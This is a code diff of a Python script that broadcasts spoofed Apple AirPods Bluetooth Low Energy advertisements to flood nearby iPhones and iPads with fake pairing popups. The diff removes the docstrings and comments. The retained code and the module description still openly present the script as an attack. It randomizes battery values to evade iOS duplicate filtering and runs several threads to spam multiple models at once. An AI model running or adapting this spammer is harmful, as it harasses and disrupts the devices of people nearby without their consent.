@@ -1,6 +1,4 @@
 """
-AirPods BLE Advertisement Spammer
-
 This script broadcasts fake Apple AirPods BLE advertisements to nearby iOS devices.
 It exploits Apple's proximity pairing protocol by sending spoofed advertisement packets
 that trigger pairing popups on iPhones and iPads.
@@ -32,20 +30,6 @@ DATA_SUFFIX = (0xda, 0x29, 0x58, 0xab, 0x8d, 0x29, 0x40, 0x3d, 0x5c, 0x1b, 0x93,
 
 
 def generate_random_battery_data(base_data, data_suffix):
-    """
-    Generate advertisement data with randomized battery levels.
-    
-    This creates realistic-looking battery data to make each advertisement
-    appear unique, preventing iOS from filtering duplicate packets.
-    
-    Args:
-        base_data (tuple): Base advertisement data for the AirPods model.
-        data_suffix (tuple): Static suffix data.
-    
-    Returns:
-        tuple: Complete advertisement packet with random battery levels.
-    """
-    # Random battery levels for left earbud, right earbud, and case
     left_battery = (random.randint(1, 100),)
     right_battery = (random.randint(1, 100),)
     case_battery = (random.randint(128, 228),)  # Higher range for case encoding
@@ -54,17 +38,6 @@ def generate_random_battery_data(base_data, data_suffix):
 
 
 def advertise_airpods(device_ids, model_name, base_data, data_suffix, interval, duration):
-    """
-    Continuously advertise a specific AirPods model for a given duration.
-    
-    Args:
-        device_ids (list): List of HCI device identifiers (e.g., ["hci0", "hci1"]).
-        model_name (str): Name of the AirPods model being advertised.
-        base_data (tuple): Base advertisement data for this model.
-        data_suffix (tuple): Static suffix data appended to advertisements.
-        interval (int): Advertising interval in milliseconds.
-        duration (int): How long to advertise in seconds.
-    """
     sockets = []
     
     try:
@@ -98,7 +71,6 @@ def advertise_airpods(device_ids, model_name, base_data, data_suffix, interval, 
         print(f"[{model_name}] Error: {e}")
     
     finally:
-        # Clean up - stop advertising on all sockets
         for sock in sockets:
             try:
                 stop_le_advertising(sock)
@@ -107,18 +79,6 @@ def advertise_airpods(device_ids, model_name, base_data, data_suffix, interval, 
 
 
 def airpods_spam(device_ids, interval=200, num_models=5, duration=60):
-    """
-    Main function to spam multiple AirPods advertisements simultaneously.
-    
-    This function creates multiple threads, each broadcasting a different
-    AirPods model, to flood nearby iOS devices with pairing requests.
-    
-    Args:
-        device_ids (list): List of HCI device identifiers (e.g., ["hci0"]).
-        interval (int): Advertising interval in milliseconds (default: 200).
-        num_models (int): Number of AirPods models to spam (default: 5, max: 5).
-        duration (int): Duration to run the spam in seconds (default: 60).
-    """
     print(f"\n{'='*60}")
     print(f"AirPods BLE Spam Attack")
     print(f"{'='*60}")
@@ -165,7 +125,6 @@ def airpods_spam(device_ids, interval=200, num_models=5, duration=60):
 
 
 def main():
-    """Command-line interface for the AirPods spam tool."""
     parser = argparse.ArgumentParser(
         description='BLE AirPods Advertisement Spammer',
         epilog='Example: python -m ble.airpods_spam -d hci0 -i 200 -t 5 -D 120'
